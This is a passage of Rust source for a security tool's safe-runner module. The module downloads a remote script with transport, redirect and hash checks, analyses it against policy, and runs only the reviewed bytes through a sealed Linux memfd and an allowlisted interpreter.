/// Safe runner. Download/inspection mode is platform-neutral in the core; live
/// execution is Linux-only and refuses before download on every other host.
use std::fs;
use std::io::{self, BufRead, Write};
use std::path::Path;
#[cfg(target_os = "linux")]
use std::process::Command;

use sha2::{Digest, Sha256};

use crate::receipt::Receipt;
use crate::script_analysis;
use crate::verdict::{Action, Verdict};

pub struct RunResult {
    pub receipt: Receipt,
    /// Redacted policy-complete body verdict. `None` only for a deliberately
    /// non-executing inspection whose bytes/interpreter could not be analyzed
    /// completely. The unredacted/raw rule IDs remain confined to the audit path.
    pub verdict: Option<Verdict>,
    pub analysis_complete: bool,
    /// True when complete analysis refused execution (distinct from `--no-exec`
    /// or a user-cancelled prompt). Carries the blocking verdict to JSON callers.
    pub refused: bool,
    pub executed: bool,
    pub exit_code: Option<i32>,
}

/// A pluggable executor for the final "run the downloaded script" step. The core
/// `runner` owns download / hashing / analysis / the confirmation prompt, but the
/// *execution* can be delegated so the CLI crate (E5) can run the interpreter
/// inside the OS containment capsule without `tirith-core` depending on the
/// capsule launcher (which is async/OS-API-bound and lives in the CLI crate).
///
/// Legacy path callback retained for downstream source compatibility. Live
/// execution through this callback is refused because a path cannot preserve
/// the reviewed-object identity contract; use [`VerifiedScriptExecutor`] with
/// [`run_with_verified_executor`] instead. `--no-exec` callers may continue to
/// construct `RunOptions` containing this field because no callback is invoked.
pub type ScriptExecutor = Box<dyn Fn(&str, &std::path::Path) -> Result<i32, String>>;

/// Additive content-bound executor used by Tirith's capsule integration. Unlike
/// the legacy path callback, this API can receive only the runner-constructed
/// immutable reviewed object. The legacy alias remains source-compatible but is
/// refused for live execution.
pub type VerifiedScriptExecutor =
    Box<dyn for<'script> Fn(&ScriptInvocation, ReviewedScript<'script>) -> Result<i32, String>>;

/// Exact bytes approved by the runner and the immutable descriptor that backs
/// file-mode execution. Construction is private to this module: executors can
/// read the approved bytes, and Linux executors can inherit the fully sealed
/// descriptor, but cannot substitute a pathname selected after review.
#[derive(Clone, Copy)]
pub struct ReviewedScript<'a> {
    bytes: &'a [u8],
    #[cfg(target_os = "linux")]
    sealed_fd: std::os::fd::RawFd,
}

impl<'a> ReviewedScript<'a> {
    /// Bytes that completed policy analysis and were re-read from the sealed
    /// execution object immediately before launch.
    pub fn bytes(self) -> &'a [u8] {
        self.bytes
    }

    /// Immutable Linux descriptor containing exactly [`Self::bytes`]. The
    /// caller must keep this borrowed value within the executor invocation.
    #[cfg(target_os = "linux")]
    pub fn sealed_fd(self) -> std::os::fd::RawFd {
        self.sealed_fd
    }
}

/// Shell interpreters that a safe-command rewrite may explicitly preserve.
/// These names are closed and path-free so an attacker cannot turn a generated
/// suggestion into an arbitrary program launch.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PipeInterpreter {
    Sh,
    Bash,
    Zsh,
    Dash,
    Ksh,
    Fish,
    Ash,
}

impl PipeInterpreter {
    /// Stable executable name passed directly to the process launcher.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Sh => "sh",
            Self::Bash => "bash",
            Self::Zsh => "zsh",
            Self::Dash => "dash",
            Self::Ksh => "ksh",
            Self::Fish => "fish",
            Self::Ash => "ash",
        }
    }
}

impl std::fmt::Display for PipeInterpreter {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

impl std::str::FromStr for PipeInterpreter {
    type Err = String;

    fn from_str(value: &str) -> Result<Self, Self::Err> {
        match value {
            "sh" => Ok(Self::Sh),
            "bash" => Ok(Self::Bash),
            "zsh" => Ok(Self::Zsh),
            "dash" => Ok(Self::Dash),
            "ksh" => Ok(Self::Ksh),
            "fish" => Ok(Self::Fish),
            "ash" => Ok(Self::Ash),
            _ => Err(format!(
                "unsupported stdin interpreter {value:?}; expected sh, bash, zsh, dash, ksh, fish, or ash"
            )),
        }
    }
}

/// How the reviewed bytes reach the selected interpreter.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScriptInputMode {
    /// Invoke the interpreter with a fully sealed anonymous descriptor containing
    /// the exact reviewed bytes (manual `tirith run`, Linux only).
    File,
    /// Pipe the reviewed bytes to stdin (safe rewrite of `<fetch> | <shell>`).
    Stdin,
}

/// Exact interpreter invocation selected before download. A forced stdin
/// invocation deliberately overrides any shebang in the remote bytes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptInvocation {
    /// Closed interpreter program name (never an arbitrary generated path).
    pub interpreter: String,
    /// Interpreter identity resolved and validated before the network request.
    /// Forced stdin invocations always carry this; manual file-mode runs retain
    /// their legacy shebang-driven resolution path.
    pub resolved_executable: Option<crate::trusted_child::TrustedExecutable>,
    /// Exact argument boundaries passed without a shell.
    pub args: Vec<String>,
    /// Whether bytes arrive by private path or stdin.
    pub input_mode: ScriptInputMode,
}

/// Validate the narrow argv contract safe-command suggestions can preserve.
/// Every supported shell may read stdin with no arguments. POSIX-family shells
/// additionally support the explicit `-s -- <literal operands...>` form. Fish
/// has no equivalent `-s` contract and therefore remains no-args only.
pub fn pipe_interpreter_args_supported(interpreter: PipeInterpreter, args: &[String]) -> bool {
    if args.is_empty() {
        return true;
    }
    if interpreter == PipeInterpreter::Fish
        || args.len() < 2
        || args[0] != "-s"
        || args[1] != "--"
        || args.len() > 34
    {
        return false;
    }
    args[2..]
        .iter()
        .all(|arg| arg.len() <= 4096 && !arg.is_empty() && !arg.chars().any(char::is_control))
}

/// Caller request corresponding to a verified pipe-to-shell suggestion.
#[derive(Debug, Clone)]
pub struct RequestedPipeInvocation {
    /// The selected shell from the original pipeline.
    pub interpreter: PipeInterpreter,
    /// Narrow, prevalidated literal argv from the original sink.
    pub args: Vec<String>,
}

pub struct RunOptions {
    pub url: String,
    pub no_exec: bool,
    pub interactive: bool,
    pub expected_sha256: Option<String>,
    /// Legacy path executor retained for source compatibility. It is never
    /// invoked for live execution; a non-`None` value with execution enabled is
    /// refused. Use [`run_with_verified_executor`] for contained execution.
    pub exec_fn: Option<ScriptExecutor>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DownloadPurpose {
    Execute,
    SaveOnly,
}

#[derive(Debug)]
struct ValidatedDownloadRequest {
    url: url::Url,
    expected_sha256: Option<String>,
}

struct DownloadedBytes {
    content: Vec<u8>,
    sha256: String,
    final_url: String,
    redirects: Vec<String>,
}

struct ScriptReview {
    interpreter: String,
    legacy: script_analysis::ScriptAnalysis,
    analysis_complete: bool,
    incomplete_reason: Option<&'static str>,
    raw_verdict: Option<Verdict>,
    effective_verdict: Option<Verdict>,
    policy: Option<crate::policy::Policy>,
}

struct ExecutionFile {
    #[cfg(target_os = "linux")]
    sealed_file: std::fs::File,
    #[cfg(not(target_os = "linux"))]
    _unsupported: (),
}

impl ExecutionFile {
    fn read_verified(&self, expected_len: usize, expected_sha256: &str) -> Result<Vec<u8>, String> {
        #[cfg(target_os = "linux")]
        {
            verify_script_seals(&self.sealed_file)?;
            let bytes = read_open_file_at(&self.sealed_file, expected_len)?;
            if bytes.len() != expected_len || sha256_hex(&bytes) != expected_sha256 {
                return Err("sealed execution object digest changed before spawn".to_string());
            }
            Ok(bytes)
        }
        #[cfg(not(target_os = "linux"))]
        {
            let _ = (self, expected_len, expected_sha256);
            Err("exact content-bound script execution is supported only on Linux".to_string())
        }
    }

    fn reviewed<'a>(&self, bytes: &'a [u8]) -> ReviewedScript<'a> {
        ReviewedScript {
            bytes,
            #[cfg(target_os = "linux")]
            sealed_fd: {
                use std::os::fd::AsRawFd as _;
                self.sealed_file.as_raw_fd()
            },
        }
    }
}

/// Interpreters matched by exact name only.
const ALLOWED_EXACT: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "ash", "deno", "bun", "nodejs",
];

/// Interpreter families allowed with an optional `digits[.digits]*` version
/// suffix (python3, python3.11, ruby3.2, node18, perl5.38).
const ALLOWED_FAMILIES: &[&str] = &["python", "ruby", "perl", "node"];

fn is_allowed_interpreter(interpreter: &str) -> bool {
    let base = interpreter.rsplit('/').next().unwrap_or(interpreter);

    if ALLOWED_EXACT.contains(&base) {
        return true;
    }

    for &family in ALLOWED_FAMILIES {
        if base == family {
            return true;
        }
        if let Some(suffix) = base.strip_prefix(family) {
            if is_valid_version_suffix(suffix) {
                return true;
            }
        }
    }

    false
}

/// A valid version suffix is `digits (.digits)*` ("3", "3.11"); rejects "", ".3", "3.", "evil".
fn is_valid_version_suffix(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    s.split('.')
        .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
}

fn normalize_sha256_pin(expected: Option<&str>) -> Result<Option<String>, String> {
    let Some(expected) = expected else {
        return Ok(None);
    };
    if expected.len() != 64 || !expected.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(format!(
            "invalid SHA-256 pin: expected exactly 64 hexadecimal characters, got '{}'",
            crate::util::truncate_bytes(expected, 16)
        ));
    }
    Ok(Some(expected.to_ascii_lowercase()))
}

/// Validate all caller-controlled request inputs before constructing a client or
/// resolving a hostname. Execution requires authenticated transport: HTTPS, or
/// the narrow compatibility case of a directly requested HTTP URL with a valid
/// digest pin. Save-only downloads retain their historical HTTP support.
fn validate_download_request(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
) -> Result<ValidatedDownloadRequest, String> {
    // The pin is intentionally first: malformed integrity metadata must fail
    // before DNS, socket, proxy, or other network-visible work.
    let expected_sha256 = normalize_sha256_pin(expected_sha256)?;
    let parsed = url::Url::parse(url).map_err(|e| format!("invalid URL: {e}"))?;
    validate_initial_transport(&parsed, expected_sha256.is_some(), purpose)?;
    crate::url_validate::validate_fetch_url(parsed.as_str())?;
    Ok(ValidatedDownloadRequest {
        url: parsed,
        expected_sha256,
    })
}

fn validate_initial_transport(
    parsed: &url::Url,
    has_sha256_pin: bool,
    purpose: DownloadPurpose,
) -> Result<(), String> {
    if purpose == DownloadPurpose::Execute && parsed.scheme() == "http" && !has_sha256_pin {
        return Err(
            "executable downloads require HTTPS; direct HTTP is allowed only with an explicit SHA-256 pin"
                .to_string(),
        );
    }
    Ok(())
}

fn validate_redirect_target(
    previous: &url::Url,
    target: &url::Url,
    purpose: DownloadPurpose,
) -> Result<(), String> {
    // No redirect hop in an executable transaction may use cleartext. This is
    // stricter than the direct-HTTP compatibility exception because a pin does
    // not justify silently changing the requested transport path.
    if purpose == DownloadPurpose::Execute && target.scheme() != "https" {
        return Err(format!(
            "executable redirect must use HTTPS ({} -> {})",
            previous.scheme(),
            target.scheme()
        ));
    }
    crate::url_validate::validate_fetch_url(target.as_str()).map(|_| ())
}

fn require_success_status(status: reqwest::StatusCode) -> Result<(), String> {
    if status.is_success() {
        Ok(())
    } else {
        Err(format!("download failed with HTTP status {status}"))
    }
}

fn sha256_hex(content: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(content);
    format!("{:x}", hasher.finalize())
}

fn download_bounded(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
) -> Result<DownloadedBytes, String> {
    let request = validate_download_request(url, expected_sha256, purpose)?;
    let redirect_list = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let redirect_list_clone = redirect_list.clone();

    let client = reqwest::blocking::Client::builder()
        .no_proxy()
        .dns_resolver(crate::ssrf_guard::fetch_resolver())
        .redirect(reqwest::redirect::Policy::custom(move |attempt| {
            if let Ok(mut list) = redirect_list_clone.lock() {
                list.push(attempt.url().to_string());
            }
            if attempt.previous().len() >= 10 {
                return attempt.error("too many redirects");
            }
            let previous = attempt.previous().last().unwrap_or(attempt.url());
            match validate_redirect_target(previous, attempt.url(), purpose) {
                Ok(()) => attempt.follow(),
                Err(reason) => attempt.error(reason),
            }
        }))
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .map_err(|e| format!("http client: {e}"))?;

    let response = client
        .get(request.url)
        .send()
        .map_err(|e| format!("download failed: {e}"))?;
    require_success_status(response.status())?;
    let final_url = response.url().to_string();

    const MAX_BODY: u64 = 10 * 1024 * 1024;
    if let Some(len) = response.content_length() {
        if len > MAX_BODY {
            return Err(format!(
                "response too large: {len} bytes (max {} MiB)",
                MAX_BODY / 1024 / 1024
            ));
        }
    }

    use std::io::Read as _;
    let mut content = Vec::new();
    response
        .take(MAX_BODY + 1)
        .read_to_end(&mut content)
        .map_err(|e| format!("read body: {e}"))?;
    if content.len() as u64 > MAX_BODY {
        return Err(format!(
            "response body exceeds {} MiB limit",
            MAX_BODY / 1024 / 1024
        ));
    }

    let sha256 = sha256_hex(&content);
    if let Some(expected) = request.expected_sha256 {
        if sha256 != expected {
            return Err(format!(
                "SHA-256 mismatch: expected {expected}, got {sha256}"
            ));
        }
    }
    let redirects = redirect_list
        .lock()
        .map(|list| list.clone())
        .unwrap_or_default();
    Ok(DownloadedBytes {
        content,
        sha256,
        final_url,
        redirects,
    })
}

fn interpreter_analysis(
    interpreter: &str,
) -> Option<(crate::tokenize::ShellType, bool, &'static str)> {
    let base = interpreter.rsplit('/').next().unwrap_or(interpreter);
    if matches!(base, "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash") {
        return Some((crate::tokenize::ShellType::Posix, true, "sh"));
    }
    if base == "fish" {
        return Some((crate::tokenize::ShellType::Fish, true, "fish"));
    }
    for (family, extension) in [
        ("python", "py"),
        ("ruby", "rb"),
        ("perl", "pl"),
        ("node", "js"),
    ] {
        if base == family
            || base
                .strip_prefix(family)
                .is_some_and(is_valid_version_suffix)
        {
            return Some((crate::tokenize::ShellType::Posix, false, extension));
        }
    }
    if matches!(base, "nodejs" | "deno" | "bun") {
        return Some((crate::tokenize::ShellType::Posix, false, "js"));
    }
    None
}

fn review_script_bytes(
    content: &[u8],
    will_execute: bool,
    interactive: bool,
    cwd: Option<&Path>,
    forced_interpreter: Option<&str>,
) -> Result<ScriptReview, String> {
    let content_str = match std::str::from_utf8(content) {
        Ok(text) => text.to_string(),
        Err(_) if will_execute => {
            return Err("refusing execution: downloaded script is not valid UTF-8".to_string())
        }
        Err(_) => {
            let lossy = String::from_utf8_lossy(content).into_owned();
            let interpreter = forced_interpreter
                .map(str::to_string)
                .unwrap_or_else(|| script_analysis::detect_interpreter(&lossy).to_string());
            return Ok(ScriptReview {
                legacy: script_analysis::analyze(&lossy, &interpreter),
                interpreter,
                analysis_complete: false,
                incomplete_reason: Some("invalid-utf8"),
                raw_verdict: None,
                effective_verdict: None,
                policy: None,
            });
        }
    };
    // A safe rewrite of `<fetch> | <shell>` must preserve the selected shell,
    // not trust a remote shebang to replace it with Python, Node, or anything
    // else. Manual `tirith run` retains shebang detection.
    let interpreter = forced_interpreter
        .map(str::to_string)
        .unwrap_or_else(|| script_analysis::detect_interpreter(&content_str).to_string());
    let Some((shell, command_semantics, extension)) = interpreter_analysis(&interpreter) else {
        if will_execute {
            return Err(format!(
                "refusing execution: interpreter '{interpreter}' has no complete analyzer"
            ));
        }
        return Ok(ScriptReview {
            legacy: script_analysis::analyze(&content_str, &interpreter),
            interpreter,
            analysis_complete: false,
            incomplete_reason: Some("unsupported-interpreter"),
            raw_verdict: None,
            effective_verdict: None,
            policy: None,
        });
    };

    let cwd_string = cwd.map(|path| path.display().to_string());
    let logical_path = cwd
        .unwrap_or_else(|| Path::new("."))
        .join(format!("downloaded-script.{extension}"));
    let ctx = crate::engine::AnalysisContext {
        input: content_str.clone(),
        shell,
        scan_context: if command_semantics {
            crate::extract::ScanContext::Exec
        } else {
            crate::extract::ScanContext::FileScan
        },
        raw_bytes: Some(content.to_vec()),
        interactive,
        cwd: cwd_string,
        file_path: (!command_semantics).then_some(logical_path.clone()),
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    };
    let analyzed = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        crate::engine::analyze_force_full_without_bypass_returning_policy(&ctx)
    }))
    .map_err(|_| "refusing execution: policy analysis did not complete".to_string())?;
    let (mut raw_verdict, policy) = analyzed;

    // Shell source is both an executable command stream and a code file. The
    // Exec pipeline supplies command/policy rules; add the repository's code-file
    // rules over the same UTF-8 bytes without reopening any path.
    if command_semantics {
        append_policy_aware_codefile_findings(
            &mut raw_verdict,
            &policy,
            &content_str,
            logical_path.to_str(),
        );
    }
    raw_verdict.agent_origin = Some(crate::agent_origin::resolve_cli_origin(interactive));
    let session_id = crate::session::resolve_session_id();
    let effective_verdict = crate::escalation::post_process_verdict(
        &raw_verdict,
        &policy,
        &content_str,
        &session_id,
        crate::escalation::CallerContext::Cli,
    );
    Ok(ScriptReview {
        legacy: script_analysis::analyze(&content_str, &interpreter),
        interpreter,
        analysis_complete: true,
        incomplete_reason: None,
        raw_verdict: Some(raw_verdict),
        effective_verdict: Some(effective_verdict),
        policy: Some(policy),
    })
}

fn append_policy_aware_codefile_findings(
    verdict: &mut Verdict,
    policy: &crate::policy::Policy,
    content: &str,
    logical_path: Option<&str>,
) {
    let first_appended = verdict.findings.len();
    verdict
        .findings
        .extend(crate::rules::codefile::check(content, logical_path));
    // These findings are produced outside engine::analyze_inner, so apply the
    // same frozen full-policy severity overrides before deriving the raw action.
    // Otherwise a code-file-only finding could bypass an org or repository
    // severity override.
    for finding in &mut verdict.findings[first_appended..] {
        if let Some(severity) = policy.severity_override(&finding.rule_id) {
            finding.severity = severity;
        }
    }
    verdict.action =
        crate::verdict::upgraded_action_from_findings(&verdict.findings, verdict.action);
}

fn apply_explicit_bypass(
    review: &mut ScriptReview,
    policy: &crate::policy::Policy,
    requested: bool,
    interactive: bool,
    surface_allows_bypass: bool,
    execution_enabled: bool,
) -> bool {
    let policy_allows = if interactive {
        policy.allow_bypass_env
    } else {
        policy.allow_bypass_env_noninteractive
    };
    let available = surface_allows_bypass && policy_allows;
    // A pending policy approval is a stronger contract than a plain block:
    // TIRITH=0 may bypass a bypassable block, but never an ungranted approval.
    // Consult the RAW findings directly so a severity override, an action
    // override, or the paranoia filter can never hide the approval-triggering
    // finding from this gate — otherwise one blocking finding outside the
    // approval rule would make the whole verdict (approval included)
    // env-bypassable.
    let approval_pending = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.requires_approval == Some(true))
        || review
            .raw_verdict
            .as_ref()
            .is_some_and(|raw| crate::approval::check_approval(raw, policy).is_some());
    let effective_is_bypassable_block = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.action == Action::Block)
        && !approval_pending;
    let honored = requested && available && execution_enabled && effective_is_bypassable_block;
    for verdict in [
        review.raw_verdict.as_mut(),
        review.effective_verdict.as_mut(),
    ]
    .into_iter()
    .flatten()
    {
        verdict.bypass_requested = requested;
        verdict.bypass_available = available;
        verdict.bypass_honored = honored;
    }
    honored
}

fn raw_audit_fields(review: &ScriptReview) -> Option<(String, Vec<String>)> {
    review.raw_verdict.as_ref().map(|raw| {
        (
            format!("{:?}", raw.action),
            raw.findings
                .iter()
                .map(|finding| finding.rule_id.to_string())
                .collect(),
        )
    })
}

fn redacted_result_verdict(review: &ScriptReview) -> Option<Verdict> {
    review.effective_verdict.as_ref().map(|effective| {
        let mut display = effective.clone();
        let custom_patterns = review
            .policy
            .as_ref()
            .map(|policy| policy.dlp_custom_patterns.as_slice())
            .unwrap_or(&[]);
        display.findings = crate::redact::redacted_findings(&display.findings, custom_patterns);
        display
    })
}

fn present_complete_verdict(verdict: &Verdict, writer: impl io::Write) -> Result<(), String> {
    crate::output::write_human(verdict, false, writer).map_err(|error| {
        format!("refusing execution because the complete verdict could not be presented: {error}")
    })
}

fn enforce_required_bypass_audit(
    live_bypass: bool,
    audit_result: Result<(), String>,
) -> Result<(), String> {
    if live_bypass {
        audit_result.map_err(|error| {
            format!(
                "refusing bypass execution because the required audit record was not persisted: {error}"
            )
        })
    } else {
        Ok(())
    }
}

fn materialize_execution_file(
    _parent: &Path,
    content: &[u8],
    expected_sha256: &str,
) -> Result<ExecutionFile, String> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = (content, expected_sha256);
        Err("exact content-bound script execution is supported only on Linux".to_string())
    }

    #[cfg(target_os = "linux")]
    {
        use std::ffi::CString;
        use std::io::{Seek as _, SeekFrom};
        use std::os::fd::{AsRawFd as _, FromRawFd as _};

        let name = CString::new("tirith-reviewed-script").expect("static memfd label has no NUL");
        let raw_fd = unsafe {
            libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC | libc::MFD_ALLOW_SEALING)
        };
        if raw_fd < 0 {
            return Err(format!(
                "create sealed execution object: {}",
                std::io::Error::last_os_error()
            ));
        }
        // SAFETY: memfd_create returned a uniquely owned descriptor.
        let mut sealed_file = unsafe { std::fs::File::from_raw_fd(raw_fd) };
        sealed_file
            .write_all(content)
            .map_err(|error| format!("write sealed execution object: {error}"))?;
        sealed_file
            .seek(SeekFrom::Start(0))
            .map_err(|error| format!("rewind sealed execution object: {error}"))?;
        let written = read_open_file_at(&sealed_file, content.len())?;
        if written.len() != content.len() || sha256_hex(&written) != expected_sha256 {
            return Err("sealed execution object digest changed while materializing".to_string());
        }
        if unsafe { libc::fchmod(sealed_file.as_raw_fd(), 0o400) } != 0 {
            return Err(format!(
                "make sealed execution object read-only: {}",
                std::io::Error::last_os_error()
            ));
        }
        let required =
            libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
        if unsafe { libc::fcntl(sealed_file.as_raw_fd(), libc::F_ADD_SEALS, required) } < 0 {
            return Err(format!(
                "seal reviewed script bytes: {}",
                std::io::Error::last_os_error()
            ));
        }
        verify_script_seals(&sealed_file)?;
        Ok(ExecutionFile { sealed_file })
    }
}

#[cfg(target_os = "linux")]
fn read_open_file_at(file: &std::fs::File, expected_len: usize) -> Result<Vec<u8>, String> {
    use std::os::unix::fs::FileExt as _;

    let mut bytes = vec![0u8; expected_len.saturating_add(1)];
    let mut offset = 0usize;
    while offset < bytes.len() {
        match file.read_at(&mut bytes[offset..], offset as u64) {
            Ok(0) => break,
            Ok(read) => offset += read,
            Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(error) => return Err(format!("read sealed execution object: {error}")),
        }
    }
    bytes.truncate(offset);
    Ok(bytes)
}

#[cfg(target_os = "linux")]
fn verify_script_seals(file: &std::fs::File) -> Result<(), String> {
    use std::os::fd::AsRawFd as _;

    let seals = unsafe { libc::fcntl(file.as_raw_fd(), libc::F_GET_SEALS) };
    if seals < 0 {
        return Err(format!(
            "inspect reviewed script seals: {}",
            std::io::Error::last_os_error()
        ));
    }
    let required = libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
    if seals & required != required {
        return Err("reviewed script descriptor is missing required immutable seals".to_string());
    }
    Ok(())
}

#[cfg(target_os = "linux")]
fn spawn_bound_reviewed_script(
    invocation: &ScriptInvocation,
    reviewed_script: ReviewedScript<'_>,
) -> Result<std::process::Child, String> {
    use std::os::unix::process::CommandExt as _;

    let program = invocation.resolved_executable.as_ref().ok_or_else(|| {
        "script execution reached launch without a trusted interpreter identity".to_string()
    })?;
    program
        .verify_identity()
        .map_err(|error| format!("trusted script interpreter changed before launch: {error}"))?;
    let interpreter_fd = program.bound_launch_fd().ok_or_else(|| {
        "script execution requires a sealed content-bound interpreter descriptor".to_string()
    })?;
    let script_fd = reviewed_script.sealed_fd();
    let mut command = Command::new(format!("/proc/self/fd/{interpreter_fd}"));
    command
        .arg0(program.invocation_path())
        .args(&invocation.args)
        .arg(format!("/proc/self/fd/{script_fd}"))
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .env("LANG", "C")
        .env("LC_ALL", "C")
        .env(
            "TERM",
            std::env::var_os("TERM").unwrap_or_else(|| "dumb".into()),
        );
    // Keep the interpreter descriptor CLOEXEC: Linux resolves the native ELF
    // image through /proc before the successful exec closes that descriptor.
    // Only the immutable script descriptor must survive into the interpreter so
    // it can open the exact reviewed bytes named in argv.
    unsafe {
        command.pre_exec(move || {
            if libc::fcntl(script_fd, libc::F_SETFD, 0) < 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(())
        });
    }
    command.spawn().map_err(|error| format!("execute: {error}"))
}

#[cfg(target_os = "linux")]
fn require_native_bound_interpreter(invocation: &ScriptInvocation) -> Result<(), String> {
    let program = invocation.resolved_executable.as_ref().ok_or_else(|| {
        "script execution requires a resolved interpreter before approval".to_string()
    })?;
    let fd = program.bound_launch_fd().ok_or_else(|| {
        "script execution requires a sealed content-bound interpreter descriptor".to_string()
    })?;
    let mut header = [0u8; 4];
    let read = unsafe {
        libc::pread(
            fd,
            header.as_mut_ptr().cast::<libc::c_void>(),
            header.len(),
            0,
        )
    };
    if read != header.len() as isize || header != *b"\x7fELF" {
        return Err(format!(
            "refusing interpreter '{}': content-bound execution requires a native ELF image",
            invocation.interpreter
        ));
    }
    Ok(())
}

/// Atomically publish downloaded bytes at their content-addressed cache path.
///
/// Bytes are written through a random sibling file and `persist` performs the
/// final rename. The destination is never opened for writing, so a precreated
/// symlink at the predictable digest name cannot redirect writes to its target.
fn persist_cache_entry(cache_dir: &Path, cached_path: &Path, content: &[u8]) -> Result<(), String> {
    let mut tmp =
        tempfile::NamedTempFile::new_in(cache_dir).map_err(|e| format!("tempfile: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        tmp.as_file()
            .set_permissions(fs::Permissions::from_mode(0o600))
            .map_err(|e| format!("permissions: {e}"))?;
    }
    tmp.write_all(content)
        .map_err(|e| format!("write cache: {e}"))?;
    // fsync bytes before rename so a crash cannot leave a partial cache entry.
    tmp.as_file()
        .sync_all()
        .map_err(|e| format!("sync cache: {e}"))?;
    tmp.persist(cached_path)
        .map_err(|e| format!("persist cache: {e}"))?;
    // Also fsync the parent directory so the rename itself is crash-durable.
    // Best-effort: persist already succeeded, so a dir-fsync failure is logged.
    crate::util::fsync_parent_dir_logged(cached_path, "run cache");
    Ok(())
}

pub fn run(opts: RunOptions) -> Result<RunResult, String> {
    if !opts.no_exec && opts.exec_fn.is_some() {
        return Err(
            "legacy path-based script executors are disabled for live execution; use the content-bound verified executor API"
                .to_string(),
        );
    }
    run_impl(opts, None, None)
}

/// Run with an additive executor that receives only the immutable reviewed
/// script object. `RunOptions::exec_fn` must remain `None`; that legacy field is
/// retained solely for downstream source compatibility and no longer authorizes
/// path-based live execution.
pub fn run_with_verified_executor(
    opts: RunOptions,
    executor: VerifiedScriptExecutor,
) -> Result<RunResult, String> {
    if opts.exec_fn.is_some() {
        return Err("cannot combine legacy and verified script executors".to_string());
    }
    run_impl(opts, None, Some(&executor))
}

/// Additive verified stdin API. The typed invocation is deliberately kept out
/// of legacy [`RunOptions`] so existing downstream struct literals remain
/// source-compatible with the original five-field contract.
pub fn run_with_verified_pipe_executor(
    opts: RunOptions,
    requested_pipe_invocation: RequestedPipeInvocation,
    executor: VerifiedScriptExecutor,
) -> Result<RunResult, String> {
    if opts.exec_fn.is_some() {
        return Err("cannot combine legacy and verified script executors".to_string());
    }
    run_impl(opts, Some(requested_pipe_invocation), Some(&executor))
}

fn run_impl(
    opts: RunOptions,
    requested_pipe_invocation: Option<RequestedPipeInvocation>,
    verified_executor: Option<&VerifiedScriptExecutor>,
) -> Result<RunResult, String> {
    if !opts.no_exec && !opts.interactive {
        return Err("tirith run requires an interactive terminal or --no-exec flag".to_string());
    }
    #[cfg(not(target_os = "linux"))]
    if !opts.no_exec {
        return Err(
            "content-bound script execution is supported only on Linux: other hosts expose no \
             complete-tree primitive for descendants that can call setsid(); refusing before \
             download, approval, or interpreter launch"
                .to_string(),
        );
    }
    let resolved_pipe_executable = if let Some(requested) = requested_pipe_invocation.as_ref() {
        if verified_executor.is_none() {
            return Err(
                "a forced stdin interpreter is accepted only with fail-closed capsule execution"
                    .to_string(),
            );
        }
        if !pipe_interpreter_args_supported(requested.interpreter, &requested.args) {
            return Err(format!(
                "unsupported argv for forced stdin interpreter '{}'",
                requested.interpreter
            ));
        }
        let executable =
            crate::trusted_child::resolve_forced_interpreter(requested.interpreter.as_str())
                .map_err(|error| {
                    format!(
                        "cannot select trusted stdin interpreter '{}': {error}",
                        requested.interpreter
                    )
                })?;
        Some(if opts.no_exec {
            executable
        } else {
            executable.bind_content().map_err(|error| {
                format!(
                    "cannot bind trusted stdin interpreter '{}' before download: {error}",
                    requested.interpreter
                )
            })?
        })
    } else {
        None
    };
    let purpose = if opts.no_exec {
        DownloadPurpose::SaveOnly
    } else {
        DownloadPurpose::Execute
    };
    let downloaded = download_bounded(&opts.url, opts.expected_sha256.as_deref(), purpose)?;
    let content = downloaded.content;
    let sha256 = downloaded.sha256;

    let cache_dir = crate::policy::data_dir()
        .ok_or("cannot determine data directory")?
        .join("cache");
    fs::create_dir_all(&cache_dir).map_err(|e| format!("create cache: {e}"))?;
    let cached_path = cache_dir.join(&sha256);
    persist_cache_entry(&cache_dir, &cached_path, &content)?;

    let cwd = std::env::current_dir().ok();
    let forced_interpreter = requested_pipe_invocation
        .as_ref()
        .map(|requested| requested.interpreter.as_str());
    let mut review = review_script_bytes(
        &content,
        !opts.no_exec,
        opts.interactive,
        cwd.as_deref(),
        forced_interpreter,
    )?;
    let mut invocation = if let Some(requested) = requested_pipe_invocation.as_ref() {
        ScriptInvocation {
            interpreter: requested.interpreter.as_str().to_string(),
            resolved_executable: resolved_pipe_executable.clone(),
            args: requested.args.clone(),
            input_mode: ScriptInputMode::Stdin,
        }
    } else {
        ScriptInvocation {
            interpreter: review.interpreter.clone(),
            resolved_executable: None,
            args: Vec::new(),
            input_mode: ScriptInputMode::File,
        }
    };
    // Keep the legacy allowlist as a second, explicit execution gate. The
